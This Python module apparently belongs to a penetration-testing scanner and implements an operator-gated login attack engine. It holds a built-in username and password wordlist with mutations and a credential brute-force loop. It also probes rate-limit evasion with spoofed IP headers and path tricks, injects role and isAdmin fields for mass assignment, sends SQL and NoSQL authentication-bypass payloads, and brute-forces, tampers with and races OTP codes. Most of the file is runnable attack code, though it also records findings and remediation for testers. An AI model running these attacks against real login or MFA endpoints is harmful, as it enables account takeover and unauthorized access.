"""
AuthAttack v1 — login attack engine for VANTHEX.
AUTHORIZED TESTING ONLY.

Operator-gated: never runs unless opts['auth_attack'] or env
PTK_AUTHATTACK=1 is set. All attempts run under a strict budget, respect
ctx.cancelled(), and stop on success.

Checks (c_*(ctx, add) style, registered into PROFILES):
- c_auth_attack: discovers login/otp/register endpoints from ctx.surface(),
  then runs run_login_attack + run_otp_attack.

Honesty rules for findings:
- CONFIRMED only from real differential evidence (server success response
  with altered credentials/code, or a status different from the lockout baseline).
- Otherwise "probable", or not reported at all.
"""
import json as _json
import os as _os
import random as _random
import threading as _threading

AUTHORIZED_TESTING_ONLY = "AUTHORIZED TESTING ONLY"

# ---- hard limits
DEFAULT_MAX_LOGIN_ATTEMPTS = 60
DEFAULT_MAX_OTP_ATTEMPTS = 40
FAST_FAIL_PROBES = 5          # probes for lockout detection
EVASION_RETRIES = 3           # retries of failed credentials with header spoofing


def _F(sev, title, desc, evidence="", cwe="", owasp="", cvss=0.0, remed="",
       confidence="probable", location="", param="", origin="authattack"):
    """Finding factory — same shape as vulnscan2.F, origin AuthAttack."""
    return {"severity": sev, "title": title, "description": desc,
            "evidence": evidence, "cwe": cwe, "owasp": owasp, "cvss": cvss,
            "remediation": remed, "confidence": confidence,
            "location": location, "param": param, "origin": origin}


# ============================================================ 1. Wordlists
_USERS_BASE = (
    "admin administrator root test info dev api user support sales contact "
    "help helpdesk webmaster postmaster hostmaster sysadmin security ftp mail "
    "backup deploy staging qa demo guest operator manager service system "
    "ubuntu oracle postgres mysql git jenkins build ci cdOps monitor nagios "
    "zabbix logs log audit backuppc tomcat www data webapp app superuser "
    "owner founder ceo cto ciso hr finance billing payroll invoice vendor "
    "partner client customer portal remote vpn gateway proxy mailer relay "
    "noc soc ittech technician intern contractor temp frank john david mike "
    "sarah chris alex sam patrick maria anna peter paul laura kevin brian "
    "jason emma mark susan jeff linda steve rachel adam olivia ryan diana "
    "scanner bot crawler health kiosk printer nas esxi vmware docker registry "
).split()

_USERS_SUFFIX_DIGITS = (1, 2, 3, 12, 23)
_USERS_YEARS = ("2023", "2024", "2025")


def build_login_wordlist():
    """Deterministic login wordlist: ~300 username-style + ~500 passwords.
    All lists are bounded (<2000 entries total) and identical on every call."""
    users, seen_u = [], set()
    for u in _USERS_BASE:
        if u not in seen_u:
            seen_u.add(u)
            users.append(u)
    for u in _USERS_BASE[:44]:
        for suf in _USERS_SUFFIX_DIGITS:
            v = f"{u}{suf}"
            if v not in seen_u:
                seen_u.add(v)
                users.append(v)
    for u in _USERS_BASE[:22]:
        for y in _USERS_YEARS:
            v = f"{u}.{y}"
            if v not in seen_u:
                seen_u.add(v)
                users.append(v)

    _PW_BASE = (
        "password 123456 admin123 12345678 qwerty 123456789 letmein welcome "
        "admin monkey dragon password1 abc123 111111 123123 qwerty123 1q2w3e "
        "1234567 1234567890 000000 iloveyou sunshine princess football "
        "charlie shadow master jordan superman batman trustno1 hunter michael "
        "baseball starwars whatever freedom ninja azerty trusted bangkok "
        "summer winter autumn spring hello freedom1 secret changeme test123 "
        "root toor administrator passw0rd p@ssw0rd admin@123 pass123 qwe123 "
        "asd123 zxc123 1qaz2wsx qazwsx 555555 654321 696969 121212 112233 "
        "google internet service canada hello123 ranger ig_default "
        "cluster master1 ascasd a1b2c3 a123456 welcome1 welcome123 login "
        "devops deploy deploy123 docker kubernetes gitlab jenkins ci cd "
        "testing test1234 tester user user123 guest guest123 demo demo123 "
        "oracle postgres mysql mongo redis elastic grafana prometheus "
        "monitoring logrunner backup backup123 support support123 info info1 "
        "sales sales123 help help123 api apisecret token oauth jwt session "
    ).split()
    passwords, seen_p = [], set()
    for p in _PW_BASE:
        if p not in seen_p:
            seen_p.add(p)
            passwords.append(p)
    # expand deterministically to ~500: digit & limited punctuation variants
    for p in list(_PW_BASE)[:70]:
        for suf in ("1", "2", "123", "!"):
            v = f"{p}{suf}"
            if v not in seen_p:
                seen_p.add(v)
                passwords.append(v)
    for p in list(_PW_BASE)[:60]:
        for y in ("2024", "2025", "2026"):
            v = f"{p}{y}"
            if v not in seen_p:
                seen_p.add(v)
                passwords.append(v)
    return users, passwords


_LEET = {"a": "4", "e": "3", "o": "0", "s": "5", "i": "1"}


def mutate(pw):
    """Deterministic mutation: append years 2024-2026, leet-swap, append
    '!' / '123'. Always returns a list of new variants (without the original pw)."""
    out, seen = [], set()
    cands = [pw + y for y in ("2024", "2025", "2026")]
    cands.append(pw + "!")
    cands.append(pw + "123")
    cands.append("".join(_LEET.get(c, c) for c in pw))
    cands.append("".join(_LEET.get(c, c) for c in pw.lower()))
    cands.append(pw.capitalize() + "!")
    for c in cands:
        if c != pw and c not in seen:
            seen.add(c)
            out.append(c)
    return out


# ============================================================ helpers
def _rate_limited(r):
    if not r:
        return False
    if r.status in (429, 423):
        return True
    b = (r.body or "").lower()
    return ("too many" in b or "rate limit" in b or "locked" in b
            or "try again later" in b)


def _json_of(r):
    try:
        return _json.loads(r.body or "")
    except Exception:
        return {}


_SUCCESS_TOKENS = ("dashboard", "token", "session", '"ok":true',
                   '"ok": true', "signed in", "login successful")


def _login_success(r):
    """Real authentication success response (not 404/rate-limit/generic failure).
    Strong markers: JSON ok:true, or token/session/dashboard in the body — a
    generic (stub) HTML 'welcome' does not count."""
    if not r or _rate_limited(r) or r.status in (401, 403, 404, 405, 400, 500, 501):
        return False
    if r.status not in (200, 302):
        return False
    j = _json_of(r)
    if j.get("ok") is True:
        return True
    b = (r.body or "").lower()
    return any(t in b for t in _SUCCESS_TOKENS) and "invalid" not in b \
        and "wrong password" not in b and "salah" not in b


_FORM_HDRS = {"Content-Type": "application/x-www-form-urlencoded"}
_JSON_HDRS = {"Content-Type": "application/json"}


def _gate(opts):
    """Operator gate: opts['auth_attack'] or env PTK_AUTHATTACK=1."""
    o = opts or {}
    if o.get("auth_attack"):
        return True
    return str(_os.environ.get("PTK_AUTHATTACK", "")).strip() in ("1", "true", "yes")


# ============================================================ 2. Login attack
def run_login_attack(ctx, login_url, username_field="username",
                     password_field="password", opts=None):
    """Bounded brute/stuff + rate-limit evasion tests + mass-assignment + SQLi.
    Returns a list of findings (called via c_auth_attack, but can be used
    directly). Only runs when the operator gate is active."""
    opts = opts or {}
    if not _gate(opts):
        return []
    findings = []
    users, passwords = build_login_wordlist()
    max_attempts = int(opts.get("max_attempts", DEFAULT_MAX_LOGIN_ATTEMPTS))

    # ---------- (a) brute / credential stuffing — stop on success
    found_creds = None
    attempts = 0
    for u in users:
        if found_creds or attempts >= max_attempts or ctx.cancelled():
            break
        for p in passwords:
            if attempts >= max_attempts or ctx.cancelled():
                break
            attempts += 1
            r = ctx.client.post(
                login_url,
                data=f"{username_field}={u}&{password_field}={p}",
                headers=_FORM_HDRS)
            if _rate_limited(r):
                break
            if _login_success(r):
                found_creds = (u, p, r.status, (r.body or "")[:200])
                break
    if found_creds:
        u, p, st, body = found_creds
        findings.append(_F(
            "CRITICAL", "Login Compromised — Valid Credentials Found",
            f"Brute-force/stuffing found a valid credential pair at "
            f"{login_url} — the account can be taken over.",
            evidence=f"accepted pair {u}:{p} -> HTTP {st}; response marker: "
                     f"{body!r}; {attempts} attempt",
            cwe="CWE-521", owasp="A07:2021 Identification & Authentication Failures",
            cvss=9.8,
            remed="Per-IP+account rate-limit, progressive lockout, MFA, a strong "
                  "password policy, and spraying detection.",
            confidence="confirmed", location=login_url,
            param=f"{username_field},{password_field}"))

    # ---------- (b) lockout & evasion tests
    canary_u = f"vhx-guest-{ctx.num_a}"
    statuses = []
    for i in range(FAST_FAIL_PROBES):
        if ctx.cancelled():
            return findings
        r = ctx.client.post(
            login_url,
            data=f"{username_field}={canary_u}{i}&{password_field}=vhx-wrong-pw",
            headers=_FORM_HDRS)
        statuses.append(r.status if r else 0)
    # an endpoint that does not speak the login language (404/405/501) ->
    # report nothing from phases b/c/d (avoid false positives)
    if all(s in (0, 404, 405, 501) for s in statuses):
        return findings
    locked = any(s in (429, 423) for s in statuses)
    if not locked:
        rl = ctx.client.post(
            login_url,
            data=f"{username_field}={canary_u}x&{password_field}=vhx-wrong-pw",
            headers=_FORM_HDRS)
        locked = _rate_limited(rl)

    if not locked:
        # MEDIUM only when the endpoint actually authenticates (returned 401/403)
        if any(s in (401, 403) for s in statuses):
            findings.append(_F(
                "MEDIUM", "No Rate Limit on Login",
                f"{FAST_FAIL_PROBES} rapid consecutive failures at "
                f"{login_url} trigger neither lockout nor 429 — online "
                f"brute-force is unimpeded.",
                evidence=f"{FAST_FAIL_PROBES+1} failed attempts -> statuses "
                         f"{statuses}, no 429/lockout",
                cwe="CWE-307", owasp="A07:2021 Identification & Authentication Failures",
                cvss=5.3,
                remed="Rate-limit per IP+account, progressive delay, lockout, CAPTCHA.",
                confidence="confirmed", location=login_url,
                param=f"{username_field},{password_field}"))
    else:
        baseline = 429
        bypass = None
        rng = _random.Random(ctx.marker)  # deterministik per-scan
        ev_hdrs = []
        for i in range(EVASION_RETRIES):
            ip = f"10.{rng.randrange(1,254)}.{rng.randrange(1,254)}.{rng.randrange(2,254)}"
            ev_hdrs.append({"X-Forwarded-For": ip, "X-Real-IP": ip,
                            "X-Originating-IP": ip})
        variants = [(login_url, h) for h in ev_hdrs]
        variants += [(login_url.rstrip("/") + "/", ev_hdrs[i % len(ev_hdrs)])
                     for i in range(EVASION_RETRIES)]
        variants += [(login_url.replace("/login", "/./login"), ev_hdrs[0]),
                     (login_url.replace("/login", "//login"), ev_hdrs[1]),
                     (login_url.replace("/login", "/%2flogin"), ev_hdrs[2])]
        for vurl, vh in variants[:12]:
            if ctx.cancelled() or bypass:
                break
            r = ctx.client.post(
                vurl,
                data=f"{username_field}={canary_u}&{password_field}=vhx-wrong-pw",
                headers=dict(_FORM_HDRS, **vh))
            if r and r.status != baseline and r.status in (200, 401, 403, 302):
                bypass = (vurl, vh, r.status, (r.body or "")[:160])
        # method override POST -> PUT
        if not bypass and not ctx.cancelled():
            r = ctx.client.request(
                "PUT", login_url,
                data=f"{username_field}={canary_u}&{password_field}=vhx-wrong-pw",
                headers=dict(_FORM_HDRS, **ev_hdrs[0]))
            if r and r.status != baseline and r.status in (200, 401, 403, 302):
                bypass = (f"PUT {login_url}", ev_hdrs[0], r.status,
                          (r.body or "")[:160])
        if bypass:
            vurl, vh, st, body = bypass
            spoof = ", ".join(f"{k}: {v}" for k, v in list(vh.items())[:1])
            findings.append(_F(
                "HIGH", "Login Rate-Limit Bypass via Header/Path Evasion",
                f"Lockout is active at {login_url}, but it can be bypassed "
                f"by spoofing IP headers (X-Forwarded-For/X-Real-IP/"
                f"X-Originating-IP) or via path variants — the rate-limit is "
                f"keyed on client-controlled header values.",
                evidence=f"locked baseline HTTP {baseline}; attempt via "
                         f"{vurl} with {spoof} -> HTTP {st}: {body!r}",
                cwe="CWE-307", owasp="A07:2021 Identification & Authentication Failures",
                cvss=7.5,
                remed="Rate-limit on the real connection/server-side session, "
                      "not spoofable headers; normalize paths "
                      "before rule matching.",
                confidence="confirmed", location=login_url,
                param="X-Forwarded-For"))

    # ---------- (c) mass-assignment / enum probe
    base_body = {username_field: f"vhx-ma-{ctx.num_a}",
                 password_field: "VhxMa-Probe1!"}
    aug = dict(base_body, role="admin", isAdmin=True, email_verified=True)
    try:
        rb = ctx.client.post(login_url, data=_json.dumps(base_body),
                             headers=_JSON_HDRS)
        ra = ctx.client.post(login_url, data=_json.dumps(aug),
                             headers=_JSON_HDRS)
        diff = (rb and ra and (rb.status != ra.status))
        jb, ja = _json_of(rb), _json_of(ra)
        if not diff and ja:
            for k in ("role", "isAdmin", "email_verified"):
                if jb.get(k) != ja.get(k) and ja.get(k) in ("admin", True):
                    diff = True
                    break
        if diff:
            findings.append(_F(
                "HIGH", "Mass Assignment in Login/Registration",
                f"A login/augmented body with the fields {list(aug.keys())[2:]} "
                f"produces a response different from the baseline — the endpoint "
                f"accepts/reflects mass-assignment fields.",
                evidence=f"baseline HTTP {rb.status} vs augmented HTTP "
                         f"{ra.status}; baseline={ (rb.body or '')[:120]!r} "
                         f"augmented={ (ra.body or '')[:120]!r}",
                cwe="CWE-915",
                owasp="A04:2021 Insecure Design", cvss=7.4,
                remed="Allowlist bindable fields; ignore privilege "
                      "fields on public input.",
                confidence="probable", location=login_url,
                param="role,isAdmin,email_verified"))
    except Exception:
        pass
    # sibling register endpoint
    if "/login" in login_url:
        reg_url = login_url.replace("/login", "/register")
        try:
            rb = ctx.client.post(reg_url, data=_json.dumps(base_body),
                                 headers=_JSON_HDRS)
            ra = ctx.client.post(reg_url, data=_json.dumps(aug),
                                 headers=_JSON_HDRS)
            jb, ja = _json_of(rb), _json_of(ra)
            reflected = ja.get("role") == "admin" or ja.get("isAdmin") is True
            if rb and ra and reflected and jb.get("role") != "admin":
                findings.append(_F(
                    "HIGH", "Mass Assignment in Login/Registration",
                    f"Registration at {reg_url} accepts the role/isAdmin fields "
                    f"and reflects them — new accounts can be elevated to admin.",
                    evidence=f"baseline role={jb.get('role')!r} vs augmented "
                             f"role={ja.get('role')!r}, isAdmin="
                             f"{ja.get('isAdmin')!r} (HTTP {ra.status})",
                    cwe="CWE-915",
                    owasp="A04:2021 Insecure Design", cvss=7.4,
                    remed="Allowlist fields; role changes only via an "
                          "authenticated admin flow.",
                    confidence="probable", location=reg_url,
                    param="role,isAdmin,email_verified"))
        except Exception:
            pass

    # ---------- (d) SQLi / noSQLi quick check (differential-confirmed)
    ghost = f"vhx-sqli-{ctx.num_a}"
    sqli_vectors = [
        ("sqli-or1e1", f"{username_field}=' or 1=1--&{password_field}=x",
         _FORM_HDRS, None),
        ("sqli-admincomment", f"{username_field}=admin'--&{password_field}=x",
         _FORM_HDRS, None),
        ("nosql-ne", None, _JSON_HDRS,
         {username_field: {"$ne": ""}, password_field: {"$ne": ""}}),
        ("sqli-or-json", None, _JSON_HDRS,
         {username_field: "' or '1'='1", password_field: "' or '1'='1"}),
    ]
    for label, form, hdrs, jbody in sqli_vectors:
        if ctx.cancelled():
            break
        try:
            data = form if form else _json.dumps(jbody)
            r = ctx.client.post(login_url, data=data, headers=hdrs)
            # differential control: an unknown user must fail
            rc = ctx.client.post(
                login_url,
                data=f"{username_field}={ghost}&{password_field}=vhx-wrong",
                headers=_FORM_HDRS)
            if _login_success(r) and rc and not _login_success(rc):
                findings.append(_F(
                    "CRITICAL", "Authentication Bypass via Injection",
                    f"The injection vector '{label}' is accepted by {login_url} as "
                    f"a valid login (differential vs the unknown-user control) — "
                    f"authentication can be bypassed without credentials.",
                    evidence=f"payload -> HTTP {r.status}: "
                             f"{(r.body or '')[:160]!r}; kontrol ghost user "
                             f"-> HTTP {rc.status} (failed)",
                    cwe="CWE-89",
                    owasp="A03:2021 Injection", cvss=9.8,
                    remed="Prepared statements / ORM, strict field-type "
                          "validation, reject query operators on JSON input.",
                    confidence="confirmed", location=login_url,
                    param=username_field))
                break
        except Exception:
            continue
    return findings


# ============================================================ 3. OTP attack
_OTP_ANCHORS = (123456, 000000, 111111, 654321, 123123)


def run_otp_attack(ctx, otp_url, opts=None):
    """Bounded OTP attack, 40 attempts: brute a 6-digit window around
    common codes, response tampering, race submits. CONFIRMED only when a code
    outside the officially accepted set is verified."""
    opts = opts or {}
    if not _gate(opts):
        return []
    findings = []
    budget = int(opts.get("max_otp_attempts", DEFAULT_MAX_OTP_ATTEMPTS))
    attempts = 0
    valid_code = None

    def _otp_ok(r):
        if not r or r.status != 200:
            return False
        j = _json_of(r)
        return (j.get("ok") is True
                or str(j.get("status", "")).lower() in ("ok", "success", "verified")
                or '"success":true' in (r.body or ""))

    def _post(code, extra=None):
        body = {"user": "admin", "code": str(code)}
        if extra:
            body.update(extra)
        return ctx.client.post(otp_url, data=_json.dumps(body),
                               headers=_JSON_HDRS)

    # brute a sequential window around common-code anchors
    for anchor in _OTP_ANCHORS:
        if valid_code or attempts >= budget or ctx.cancelled():
            break
        for delta in range(0, 7):
            for code in (anchor + delta, anchor - delta) if delta else (anchor,):
                if attempts >= budget or ctx.cancelled():
                    break
                if not (0 <= code <= 999999):
                    continue
                attempts += 1
                r = _post(code)
                if _rate_limited(r):
                    break
                if _otp_ok(r):
                    valid_code = code
                    break
            if valid_code:
                break

    if valid_code is not None:
        # window evidence: is a neighbor code (outside the single official code) also accepted?
        neighbor = valid_code + 2
        r = _post(neighbor)
        attempts += 1
        window_open = _otp_ok(r)
        findings.append(_F(
            "HIGH", "OTP Brute-Force Window Open",
            f"The OTP endpoint {otp_url} accepts weak codes without adequate "
            f"lockout — the 6-digit brute-force window is open."
            + (" A neighbor code was also accepted: the valid range is too wide."
               if window_open else ""),
            evidence=f"accepted code {valid_code} after {attempts} attempts "
                     f"(HTTP 200)"
                     + (f"; neighbor {neighbor} also accepted"
                        if window_open else ""),
            cwe="CWE-307", owasp="A07:2021 Identification & Authentication Failures",
            cvss=7.5,
            remed="Strict per-code/account rate-limit, long random codes, "
                  "short expiry, single-use.",
            confidence="confirmed" if window_open else "probable",
            location=otp_url, param="code"))
    else:
        # no valid code found: test tampering & race only if the operator
        # provides an official test code
        test_code = opts.get("test_otp_code")
        if test_code and attempts < budget and not ctx.cancelled():
            rv = _post(test_code)
            if _otp_ok(rv):
                # tampering: wrong code + decision fields in the body
                rt = _post("000000", {"ok": True, "status": "success",
                                      "verified": True})
                if _otp_ok(rt):
                    findings.append(_F(
                        "CRITICAL", "MFA Bypass via Response Tampering",
                        f"The OTP endpoint {otp_url} trusts the verification decision "
                        f"from client-controlled fields — a wrong code "
                        f"is accepted when the body contains ok/status success.",
                        evidence=f"valid code -> HTTP {rv.status}; wrong code "
                                 f"+ ok:true -> HTTP {rt.status}: "
                                 f"{(rt.body or '')[:120]!r}",
                        cwe="CWE-287",
                        owasp="A07:2021 Identification & Authentication Failures",
                        cvss=9.1,
                        remed="Derive the verification decision only from "
                              "server-side state; ignore client decision fields.",
                        confidence="confirmed", location=otp_url,
                        param="code,ok"))
                # race: 3 concurrent submits of the same code
                results = []
                def _race():
                    try:
                        results.append(_otp_ok(_post(test_code)))
                    except Exception:
                        results.append(False)
                threads = [_threading.Thread(target=_race) for _ in range(3)]
                for t in threads:
                    t.start()
                for t in threads:
                    t.join(10)
                if sum(1 for x in results if x) >= 2 and \
                        opts.get("otp_single_use"):
                    findings.append(_F(
                        "HIGH", "OTP Race Condition — Single-Use Not Enforced",
                        f"The same OTP code was accepted >=2x concurrently "
                        f"at {otp_url} although it should be single-use.",
                        evidence=f"{sum(1 for x in results if x)}/3 concurrent "
                                 f"submits accepted for code {test_code}",
                        cwe="CWE-367", owasp="A07:2021", cvss=7.5,
                        remed="Atomically mark the code as used "
                              "(atomic claim) before verification.",
                        confidence="confirmed", location=otp_url,
                        param="code"))
    return findings


# ============================================================ 4. Check entry
def c_auth_attack(ctx, add):
    """CHECKS entry: discover login/otp endpoints from ctx.surface(), then
    run run_login_attack + run_otp_attack. A silent no-op unless the
    operator gate is active."""
    if not _gate(getattr(ctx, "opts", None) or {}):
        return
    try:
        surf = ctx.surface(full=True)
        eps = list(getattr(surf, "js_endpoints", None) or [])
    except Exception:
        eps = []
    eps = [str(e) for e in eps]
    cands = [e for e in eps
             if ("login" in e.lower() or "auth" in e.lower())
             and "/safe" not in e]
    # default/fixture candidates — always considered (the pre-probe
    # filters out anything that does not respond like an auth endpoint)
    for d in ("/auth/login", "/auth/open-login"):
        if d not in cands:
            cands.append(d)
    # pre-probe: only endpoints that answer 200/401/403 to a POST with wrong
    # credentials — not 404s or stubs that accept everything
    live = []
    for e in cands[:6]:
        if ctx.cancelled():
            break
        try:
            r = ctx.client.post(
                e, data="username=vhx-probe&password=vhx-probe",
                headers=_FORM_HDRS)
            if r and r.status in (200, 401, 403):
                live.append(e)
        except Exception:
            continue
    # priority: /auth/ endpoints first, then shortest; max 2
    live.sort(key=lambda e: (0 if "/auth" in e else 1, len(e)))
    otp_cands = [e for e in eps if "otp" in e.lower() and "/safe" not in e]
    if "/auth/otp" not in otp_cands:
        otp_cands.append("/auth/otp")
    otp_live = []
    for e in otp_cands[:3]:
        if ctx.cancelled():
            break
        try:
            r = ctx.client.post(e, data='{"user":"admin","code":"000000"}',
                                headers=_JSON_HDRS)
            if r and r.status in (200, 401, 403):
                otp_live.append(e)
        except Exception:
            continue

    seen = set()
    for ep in live[:2]:
        if ep in seen or ctx.cancelled():
            continue
        seen.add(ep)
        for f in run_login_attack(ctx, ep, opts=ctx.opts):
            add(f)
    for ep in otp_live[:1]:
        if ep in seen or ctx.cancelled():
            continue
        seen.add(ep)
        for f in run_otp_attack(ctx, ep, opts=ctx.opts):
            add(f)


CHECKS = [c_auth_attack]
